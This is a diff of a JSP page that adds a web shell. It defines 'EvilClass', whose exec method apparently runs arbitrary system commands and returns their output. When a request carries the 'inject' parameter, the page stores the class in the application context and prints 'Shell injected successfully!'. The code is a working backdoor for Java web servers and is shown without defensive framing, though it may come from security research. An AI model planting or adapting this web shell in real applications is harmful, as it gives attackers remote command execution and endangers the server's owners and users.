@@ -1,9 +1,8 @@
 <%@ page import="java.io.IOException" %>
 <%@ page import="java.io.InputStream" %>
 
-<%
-    // local class declaration can work too
-    class EvilClass {
+<%!
+    public class EvilClass {
         public String exec(String cmd) {
             StringBuilder output = new StringBuilder();
             try {
@@ -20,6 +19,11 @@
             return output.toString();
         }
     }
+%>
 
-    application.setAttribute("EvilClass", new EvilClass());
+<%
+    if (request.getParameter("inject") != null) {
+        application.setAttribute("EvilClass", new EvilClass());
+        response.getWriter().println("Shell injected successfully!");
+    }
 %>
